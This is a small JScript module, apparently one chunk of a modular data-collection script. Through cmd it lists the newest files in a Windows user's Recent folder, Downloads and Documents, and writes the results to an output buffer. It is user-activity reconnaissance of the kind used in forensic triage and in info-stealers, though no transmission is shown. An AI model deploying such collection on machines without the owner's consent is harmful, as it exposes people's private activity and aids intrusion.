// chunk: collectors/recent_files
// depends: core/emit_buffer, core/run_cmd
// provides: collect_recent_files
// format: jscript

function collect_recent_files() {
    emit("\r\n=== RECENT FILES ===\r\n");
    var recent = _s.ExpandEnvironmentStrings("%APPDATA%") + "\\Microsoft\\Windows\\Recent";
    emit(_run("dir /b /o-d \"" + recent + "\" 2>NUL"));
    emit("\r\n=== RECENT DOWNLOADS ===\r\n");
    var dl = _s.ExpandEnvironmentStrings("%USERPROFILE%") + "\\Downloads";
    emit(_run("dir /b /o-d \"" + dl + "\" 2>NUL"));
    emit("\r\n=== RECENT DOCUMENTS ===\r\n");
    var docs = _s.ExpandEnvironmentStrings("%USERPROFILE%") + "\\Documents";
    emit(_run("dir /b /o-d \"" + docs + "\" 2>NUL"));
}
